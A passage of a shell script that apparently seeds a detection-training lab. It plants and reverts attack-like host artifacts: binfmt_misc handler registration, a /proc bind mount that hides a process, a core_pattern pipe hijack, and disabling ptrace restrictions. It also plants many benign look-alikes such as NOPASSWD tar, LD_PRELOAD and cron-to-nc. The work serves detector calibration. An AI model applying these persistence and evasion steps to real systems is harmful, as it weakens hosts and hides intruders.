binfmt-register:plant)
  $SUDO sh -c 'mountpoint -q /proc/sys/fs/binfmt_misc 2>/dev/null || mount -t binfmt_misc none /proc/sys/fs/binfmt_misc' 2>/dev/null || true
  interp="$(pick /tmp/.x/interp /var/tmp/.cache/interp)"; $SUDO mkdir -p "$(dirname "$interp")"; $SUDO cp /bin/true "$interp"
  # write the register entry inside sudo (lab_sudo consumes stdin for the password,
  # so the magic string must go via `sh -c >`, not a pipe into `sudo tee`).
  $SUDO sh -c "printf ':evilfmt:E::evilx::%s:\n' '$interp' > /proc/sys/fs/binfmt_misc/register" 2>/dev/null || true ;;
binfmt-register:clean)
  $SUDO sh -c 'echo -1 > /proc/sys/fs/binfmt_misc/evilfmt' 2>/dev/null || true
  $SUDO rm -rf /tmp/.x /var/tmp/.cache ;;

proc-bind-mount:plant)
  # needs SELinux permissive/off: an enforcing policy denies bind-mounting over /proc/<pid>.
  nohup sleep 600 >/dev/null 2>&1 </dev/null & echo $! > "$RUNDIR/pbm.pid"; sleep 0.3
  p=$(cat "$RUNDIR/pbm.pid"); $SUDO mount --bind /tmp "/proc/$p" 2>/dev/null || true ;;
proc-bind-mount:clean)
  p=$(cat "$RUNDIR/pbm.pid" 2>/dev/null); [ -n "$p" ] && { $SUDO umount "/proc/$p" 2>/dev/null; kill "$p" 2>/dev/null; }
  rm -f "$RUNDIR/pbm.pid"; true ;;

# ---- Wave #2: kernel-state (need root + a real host; reversible, run via --target)
# Each saves the original value and restores it on clean. No modules, no crashes.
core-pattern:plant)
  $SUDO sh -c "cat /proc/sys/kernel/core_pattern > '$RUNDIR/core_pattern.orig'" 2>/dev/null || true
  $SUDO sh -c "printf '|%s %%P\n' '$(pick /tmp/.x/collect /var/tmp/.cache/collect)' > /proc/sys/kernel/core_pattern" 2>/dev/null || true ;;
core-pattern:clean)
  [ -s "$RUNDIR/core_pattern.orig" ] && $SUDO sh -c "cat '$RUNDIR/core_pattern.orig' > /proc/sys/kernel/core_pattern" 2>/dev/null
  rm -f "$RUNDIR/core_pattern.orig"; true ;;

yama-runtime:plant)
  $SUDO sh -c "cat /proc/sys/kernel/yama/ptrace_scope > '$RUNDIR/yama.orig'" 2>/dev/null || true
  $SUDO sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope' 2>/dev/null || true ;;
yama-runtime:clean)
  [ -s "$RUNDIR/yama.orig" ] && $SUDO sh -c "cat '$RUNDIR/yama.orig' > /proc/sys/kernel/yama/ptrace_scope" 2>/dev/null
  rm -f "$RUNDIR/yama.orig"; true ;;

# ---- Benign-but-flagged NEGATIVES (calibrate ambiguous-rule precision) --------
# Same structural artifact as a real attack, but a legitimate intent — so the model
# learns these medium/ambiguous rules are lower-precision (the negative class).
benign-sysctl-dev:plant)
  mkdir -p /etc/sysctl.d
  printf '# loosen ptrace for local debugging in this dev box\nkernel.yama.ptrace_scope = 0\n' > /etc/sysctl.d/90-dev-debug.conf ;;
benign-sysctl-dev:clean) rm -f /etc/sysctl.d/90-dev-debug.conf ;;

benign-ci-docker:plant)
  groupadd docker 2>/dev/null || true; usermod -aG docker svc-metrics 2>/dev/null || true ;;
benign-ci-docker:clean) gpasswd -d svc-metrics docker 2>/dev/null || true; true ;;

benign-dev-path:plant)
  save /etc/profile
  printf 'PATH="/usr/local/bin:/usr/bin:."\n' > /etc/profile ;;  # dev convenience: cwd in PATH
benign-dev-path:clean) restore /etc/profile ;;

benign-home-service:plant)
  f="$(pick /etc/systemd/system/ci-runner.service /etc/systemd/system/gitlab-runner.service)"
  printf '[Service]\nExecStart=%s\n[Install]\nWantedBy=multi-user.target\n' "$(pick /home/deploy/actions-runner/run.sh /home/gitlab-runner/builds/run.sh)" > "$f" ;;
benign-home-service:clean) rm -f /etc/systemd/system/ci-runner.service /etc/systemd/system/gitlab-runner.service ;;

benign-supervisor-port:plant)
  bg "$RUNDIR/benign-port.pid" $LABDIR/helper --listen 9001 ;;   # supervisord web UI uses 9001
benign-supervisor-port:clean) kill_pid "$RUNDIR/benign-port.pid" ;;

# ---- Benign-but-flagged NEGATIVES, wave 2 -------------------------------------
# Same contract as wave 1: a configuration a competent admin actually ships, which
# happens to trip an ambiguous rule. These are the model's NEGATIVE class. Without
# enough of them the range teaches "whatever a rule fires on is real" — the prior of
# an attack lab, not of a fleet, and the opposite of what a prioritiser needs. Each
# entry says why the config is legitimate; if that justification doesn't hold, the
# scenario is mislabelled data and belongs in the positive set instead.
#
# Both variants stay legitimate here: obvious/stealthy vary the vendor and naming,
# not the intent, so the pair still teaches structure rather than names.

benign-backup-sudo-tar:plant)
  # Granting a backup group tar/rsync under NOPASSWD is standard practice; both are
  # also GTFOBins shell escapes, so the rule cannot tell this from a privesc grant.
  mkdir -p /etc/sudoers.d
  printf '%%backup ALL=(root) NOPASSWD: /usr/bin/%s\n' "$(pick tar rsync)" > /etc/sudoers.d/90-backup ;;
benign-backup-sudo-tar:clean) rm -f /etc/sudoers.d/90-backup ;;

benign-apm-ptrace-cap:plant)
  # APM/profiler agents (and perf wrappers) legitimately carry cap_sys_ptrace so they
  # can read other processes without running as root — the least-privilege option.
  f="$(pick /usr/local/bin/apm-profiler /usr/local/bin/perf-agent)"
  cp /bin/true "$f"; setcap cap_sys_ptrace+ep "$f" 2>/dev/null || true ;;
benign-apm-ptrace-cap:clean) rm -f /usr/local/bin/apm-profiler /usr/local/bin/perf-agent ;;

benign-internal-mirror:plant)
  # An internal mirror on a trusted network, served unsigned because the operator
  # controls both ends. Indistinguishable from an attacker-added unsigned repo.
  mkdir -p /etc/apt/sources.list.d
  f="$(pick /etc/apt/sources.list.d/internal-mirror.list /etc/apt/sources.list.d/corp-apt.list)"
  printf 'deb [trusted=yes] http://%s/debian stable main\n' "$(pick apt.internal.corp mirror.lan)" > "$f" ;;
benign-internal-mirror:clean) rm -f /etc/apt/sources.list.d/internal-mirror.list /etc/apt/sources.list.d/corp-apt.list ;;

benign-ci-docker-sock:plant)
  # CI runners and container-monitoring agents are routinely given a world-readable
  # docker socket so an unprivileged runner can build. Also a container-escape path.
  save /run/docker.sock; mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
benign-ci-docker-sock:clean) restore /run/docker.sock ;;

benign-nss-extrausers:plant)
  # libnss-extrausers ships an extra account database outside /etc/passwd (Ubuntu
  # Core, appliance images). A non-standard NSS module by design, not a backdoor.
  save /etc/nsswitch.conf
  printf 'passwd: files %s\ngroup: files\n' "$(pick extrausers pgsql)" > /etc/nsswitch.conf ;;
benign-nss-extrausers:clean) restore /etc/nsswitch.conf ;;

benign-backup-key-env:plant)
  # A backup key pinned with environment= (PermitUserEnvironment) to set the repo and
  # a bandwidth cap. Same option an attacker uses to inject LD_PRELOAD.
  save /root/.ssh/authorized_keys
  d=/root/.ssh; mkdir -p "$d"; chmod 700 "$d"
  printf '%s ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s backup@backup-01\n' \
    "$(pick 'environment="BORG_REPO=/srv/backup"' 'environment="RSYNC_BWLIMIT=2000"')" \
    "$(pick BackupKeyMaterial00000000000000000000000000 OffsiteKeyMaterial0000000000000000000000000)" > "$d/authorized_keys"
  chmod 600 "$d/authorized_keys" ;;
benign-backup-key-env:clean) restore /root/.ssh/authorized_keys ;;

benign-upgraded-daemon:plant)
  # The ordinary state of a host between `apt upgrade` and a restart: the daemon is
  # still running from a binary the package manager already replaced/removed.
  b="$(pick /usr/local/bin/metrics-agent /usr/local/bin/log-shipper)"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/benign-upgraded.pid" "$b"; rm -f "$b" ;;
benign-upgraded-daemon:clean) kill_pid "$RUNDIR/benign-upgraded.pid" ;;

benign-apm-py-hook:plant)
  # A site-wide .pth that starts a vendor agent on every interpreter launch — how
  # auto-instrumentation is actually shipped. Executes code at startup either way.
  f="$(pick /usr/lib/python3.11/site-packages/apm-bootstrap.pth /usr/lib/python3.11/site-packages/corp-telemetry.pth)"
  printf "import os, subprocess; subprocess.Popen(['%s', '--python-hook'])\n" \
    "$(pick /usr/local/bin/apm-agent /usr/local/bin/corp-agent)" > "$f" ;;
benign-apm-py-hook:clean) rm -f /usr/lib/python3.11/site-packages/apm-bootstrap.pth /usr/lib/python3.11/site-packages/corp-telemetry.pth ;;

benign-vendor-permissive:plant)
  # Vendor appliances and some database images are only supported with SELinux in
  # permissive mode. A deliberate, documented decision that looks like evasion.
  save /etc/selinux/config; mkdir -p /etc/selinux
  printf 'SELINUX=permissive\nSELINUXTYPE=%s\n' "$(pick targeted mls)" > /etc/selinux/config ;;
benign-vendor-permissive:clean) restore /etc/selinux/config ;;

benign-ci-nohistory:plant)
  # Disabling history for a build account is a HARDENING step: it stops tokens passed
  # on the command line from being written to disk. The rule reads it as anti-forensics.
  printf '\n%s\n' "$(pick 'export HISTFILE=/dev/null' 'unset HISTFILE')" >> /home/svc-metrics/.bashrc ;;
benign-ci-nohistory:clean) rm -f /home/svc-metrics/.bashrc ;;

benign-dba-tunnel:plant)
  # A remote-forward tunnel so an on-call DBA can reach a database through a bastion.
  # Structurally identical to an attacker's egress channel.
  bg "$RUNDIR/benign-tunnel.pid" bash -c "exec -a ssh $LABDIR/helper -fNR $(pick 15432:localhost:5432 13306:localhost:3306) bastion@10.0.0.9" ;;
benign-dba-tunnel:clean) kill_pid "$RUNDIR/benign-tunnel.pid" ;;

benign-netflow-agent:plant)
  # Flow exporters and IDS sensors hold AF_PACKET sockets by design — that is the job.
  bg "$RUNDIR/benign-packet.pid" bash -c "exec -a $(pick netflow-agent ids-sensor) $LABDIR/helper --packet" ;;
benign-netflow-agent:clean) kill_pid "$RUNDIR/benign-packet.pid" ;;

benign-ci-build-tmp:plant)
  # A CI job compiles and runs its own build helper out of the workspace under /tmp.
  d="$(pick /tmp/ci-build /tmp/runner-work)"; mkdir -p "$d"
  cp $LABDIR/helper "$d/build-helper"; bg "$RUNDIR/benign-ciexec.pid" "$d/build-helper" ;;
benign-ci-build-tmp:clean) kill_pid "$RUNDIR/benign-ciexec.pid"; rm -rf /tmp/ci-build /tmp/runner-work ;;

benign-appimage-lib:plant)
  # An AppImage is mounted under /tmp/.mount_<name> and its bundled libraries load from
  # there for as long as it runs. Identical in shape to an injected library in /tmp.
  d="$(pick /tmp/.mount_editor/usr/lib /tmp/.mount_vendorXk2/usr/lib)"; mkdir -p "$d"
  cp /bin/true "$d/libapp.so"; bg "$RUNDIR/benign-appimage.pid" $LABDIR/helper --map "$d/libapp.so" ;;
benign-appimage-lib:clean) kill_pid "$RUNDIR/benign-appimage.pid"; rm -rf /tmp/.mount_editor /tmp/.mount_vendorXk2 ;;

benign-jvm-native-lib:plant)
  # JNA, Netty, snappy-java and RocksDB JNI unpack a native library to a temp directory,
  # load it, and delete it at once. The process keeps a mapping of a file that no longer
  # exists — exactly what a library loaded and then wiped by an intruder looks like.
  f="$(pick /home/deploy/.cache/JNA/temp/jna1383357634.tmp /tmp/libnetty_transport_native_epoll_x86_64817264.so)"
  mkdir -p "$(dirname "$f")"; cp /bin/true "$f"
  bg "$RUNDIR/benign-jvm.pid" $LABDIR/helper --map "$f"; rm -f "$f" ;;
benign-jvm-native-lib:clean) kill_pid "$RUNDIR/benign-jvm.pid"; rm -rf /home/deploy/.cache/JNA /tmp/libnetty_transport_native_epoll_x86_64817264.so ;;

benign-preload-faketime:plant)
  # Test suites preload libfaketime from the developer's own tools directory to fix the
  # clock. The same variable, pointing at a home directory, an intruder's loader uses.
  bg "$RUNDIR/benign-faketime.pid" env "LD_PRELOAD=$(pick /home/deploy/tools/libfaketime.so.1 /home/ci/.local/lib/libfaketime.so.1)" FAKETIME="@2026-01-01 00:00:00" $LABDIR/helper ;;
benign-preload-faketime:clean) kill_pid "$RUNDIR/benign-faketime.pid" ;;

benign-installer-staging:plant)
  # Unattended vendor installers stage a hidden helper in /tmp for the duration of
  # the upgrade. Hidden + executable under /tmp is exactly the rule's trigger.
  d="$(pick /tmp/.agent-install /tmp/.vendor-upgrade)"; mkdir -p "$d"
  cp /bin/true "$d/.preinstall"; chmod 755 "$d/.preinstall" ;;
benign-installer-staging:clean) rm -rf /tmp/.agent-install /tmp/.vendor-upgrade ;;

benign-audit-toolbox:plant)
  # An authorised engagement: the security team's own tunneller staged on the jump
  # host they were given. Same bytes as an intruder's copy — only the paperwork differs.
  f="$(pick /var/tmp/engagement-2026/chisel /var/tmp/pentest-tools/frp)"; mkdir -p "$(dirname "$f")"
  printf 'package main\nimport _ "github.com/%s"\n' "$(pick jpillora/chisel fatedier/frp)" > "$f" ;;
benign-audit-toolbox:clean) rm -rf /var/tmp/engagement-2026 /var/tmp/pentest-tools ;;

benign-legacy-uid-alias:plant)
  # A second login name kept on an existing UID so a legacy application and its new
  # name resolve to the same account during a migration.
  useradd -o -u "$(id -u deploy 2>/dev/null || echo 1001)" -M "$(pick app-legacy www-legacy)" 2>/dev/null || true ;;
benign-legacy-uid-alias:clean) userdel app-legacy 2>/dev/null; userdel www-legacy 2>/dev/null; true ;;

benign-metrics-cron-pipe:plant)
  # A metrics cron piping a health check into statsd/netcat. The rule flags "nc " in
  # a cron line because that is also how a cradle exfiltrates.
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/node-health /etc/cron.d/statsd-report)"
  printf '*/5 * * * * root /usr/local/bin/health.sh | nc %s\n' "$(pick 'metrics.internal 8125' 'statsd.lan 8125')" > "$f" ;;
benign-metrics-cron-pipe:clean) rm -f /etc/cron.d/node-health /etc/cron.d/statsd-report ;;

benign-deploy-unit-group:plant)
  # A unit file owned by the deploy group so CI can update it without root. Common in
  # push-deploy setups, and a genuine root-injection path — hence the ambiguity.
  f="$(pick /etc/systemd/system/app-web.service /etc/systemd/system/app-worker.service)"
  printf '[Service]\nExecStart=/usr/bin/true\n' > "$f"
  chgrp deploy "$f" 2>/dev/null || true; chmod g+w "$f" ;;
benign-deploy-unit-group:clean) rm -f /etc/systemd/system/app-web.service /etc/systemd/system/app-worker.service ;;

benign-dev-ssh-localcmd:plant)
  # A developer's ssh config renaming the tmux window on connect. LocalCommand is a
  # documented convenience feature and an exec-on-connect primitive.
  save /root/.ssh/config; mkdir -p /root/.ssh; chmod 700 /root/.ssh
  printf 'Host *\n  PermitLocalCommand yes\n  LocalCommand %s\n' \
    "$(pick '/usr/local/bin/tmux-title.sh %n' '/usr/local/bin/set-window-name.sh %h')" > /root/.ssh/config ;;
benign-dev-ssh-localcmd:clean) restore /root/.ssh/config ;;

benign-vendor-supervisor:plant)
  # A vendor app whose supervisor program runs out of its own cache under /var/tmp.
  # Poor packaging, not an implant — and the rule cannot tell.
  mkdir -p /etc/supervisor/conf.d
  f="$(pick /etc/supervisor/conf.d/vendor-app.conf /etc/supervisor/conf.d/report-worker.conf)"
  printf '[program:%s]\ncommand=%s --serve\n' "$(pick vendor-app report-worker)" \
    "$(pick /var/tmp/vendor-app/bin/run /var/tmp/report-worker/bin/run)" > "$f" ;;
benign-vendor-supervisor:clean) rm -f /etc/supervisor/conf.d/vendor-app.conf /etc/supervisor/conf.d/report-worker.conf ;;

benign-staging-execpre:plant)
  # A staging box where the app is deployed into the deploy user's home and a
  # pre-start hook prepares it. Normal for staging, a red flag on a production host.
  f="$(pick /etc/systemd/system/staging-api.service /etc/systemd/system/staging-web.service)"
  printf '[Service]\nExecStartPre=%s\nExecStart=/usr/bin/true\n' \
    "$(pick /home/deploy/app/bin/pre-start.sh /home/deploy/releases/current/setup.sh)" > "$f" ;;
benign-staging-execpre:clean) rm -f /etc/systemd/system/staging-api.service /etc/systemd/system/staging-web.service ;;

*) echo "unknown technique/action: $ID:$ACT" >&2; exit 2 ;;
esac
